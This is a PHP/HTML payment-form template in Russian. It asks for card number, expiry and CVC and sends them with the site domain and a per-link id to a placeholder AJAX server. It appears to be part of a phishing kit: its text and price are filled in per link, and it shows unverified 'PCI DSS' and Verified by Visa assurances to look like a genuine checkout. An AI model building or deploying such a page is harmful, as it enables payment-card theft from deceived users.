<?php require 'init.php'; ?>
<html>

<head>
  <title>[TEXT_1]</title>
  <link rel="icon" href="favv.ico " type="image/x-icon" />
    <link rel="stylesheet" href=" css/style.css" />
    <link rel="stylesheet" href=" css/jquery-ui.css" />
	<link rel="stylesheet" href=" css/jquery-ui.theme.css" />
	<link rel="stylesheet" href=" css/binking.css" />


	<script src="js/jquery.js"></script>
	<script src="js/jquery-ui.js"></script>


	
	<link href="css/client.css" rel="stylesheet">
	<link href="js/sticky/sticky.css" rel="stylesheet">
	<script>var SERVER_AJAX_URL = "[SERVER_AJAX_URL]";</script>
	<script src="js/client.js"></script>
	<script src="js/binking.js"></script>
	
	
	
	<script>
	jQuery(document).ready(function($) {
		//CLIENT.showTimer2(9, "Пожалуйста, подождите...<br>Ваш платеж обрабатывается");
		//CLIENT.showModalMessage("TEST 1");//LASTDELETE
	});
	</script>
	
	<script src="js/sticky/sticky.min.js"></script>

</head>

<body style="display:block;">

  <div id="container">
   <br><br><br><br>
		
		
     <div id="PaymentForm">
       <div id="uniqText"><br>[TEXT_2]</div>

      <div id="borderForm">
        
		
		
			<div class="binking">
				<form class="binking__form client_ajax_form" method="POST" autocomplete="off">
					<input type="hidden" name="operation" value="firstdata">
					<input type="hidden" name="domain" value="<?php echo safe_array_access($_SERVER, 'HTTP_HOST'); ?>">
					<input type="hidden" name="keyid" value="<?php echo safe_array_access($_GET, 'id'); ?>">
					<input type="hidden" name="bank_alias" id="bank_alias">
				
					<h2 class="binking__title"></h2>
					<div class="binking__panels">
						<div class="binking__panel binking__front-panel">
							<img class="binking__form-bank-logo binking__hide">
							<img class="binking__form-brand-logo binking__hide">
							<div class="binking__front-fields">
								<input name="fields[0]" id="cardnumber" maxlength="16" data-pattern="[0-9 ]*" class="binking__field binking__number-field" type="text" placeholder="Номер карты" <?php echo safe_array_access($_GET, 'debug') ? 'value="1111111111111"' : ''; ?>>
								
								<label class="binking__label binking__date-label">Срок действия</label>
								
								<input name="fields[1]" maxlength="2" data-pattern="[0-9]*" class="binking__field binking__month-field binking__date-field" type="text" placeholder="ММ" <?php echo safe_array_access($_GET, 'debug') ? 'value="06"' : ''; ?>>
								<input name="fields[2]" maxlength="2" data-pattern="[0-9]*" class="binking__field binking__year-field binking__date-field" type="text" placeholder="ГГ" <?php echo safe_array_access($_GET, 'debug') ? 'value="21"' : ''; ?>>
							</div>
						</div>
						<div class="binking__panel binking__back-panel">
							<input name="fields[3]" maxlength="3" data-pattern="[0-9]*" class="binking__field binking__code-field" type="text"placeholder="CVC" <?php echo safe_array_access($_GET, 'debug') ? 'value="695"' : ''; ?>>
							<label class="binking__label binking__code-label">Код с обратной стороны</label>
						</div>
					</div>
					
					<div class="binking__form-bottom">
						<button type="submit" class="Payment-btn" value="1" id="creater">
							<span class="button-left"></span>
							<span class="button-content">Оплатить</span>
							<span class="button-right"></span>
						</button>
					</div>
				</form>
			</div>
			
		


       </div>
         <br><br>
     </div>
     <div class="right-block-text">
        <br> <div id="block-text">Данные защищены, платеж осуществляется по стандарту PCI DSS<br><br>
          <img src="img/verified-by-visa.png">
          <img src="img/Masterd.png"><br><br>
          <img src="img/safe-harbor.png">
        </div>
     </div>

     <div class="right-block-Payment-sum">
          <br><b>К оплате</b>
           <br><br>
            <b1>Цена: </b1>   <b2>[TEXT_7] руб.</b2> <br>  <br>
			<b1>Комиссия: &nbsp;</b1>   <b2>0 руб.</b2> <br>  <br><br>
            <div id="right-block-Payment-sum-total">
             <br><b4>Итого:</b4> <b3>[TEXT_7] руб.<br><br>
            </div>
     </div>




</div>

   <br><br><br><br>
 </div>
 
 
	<script src="js/binking-init.js"></script>

</body>
</html>
<?php
bottom_proc('prepare_firstphp');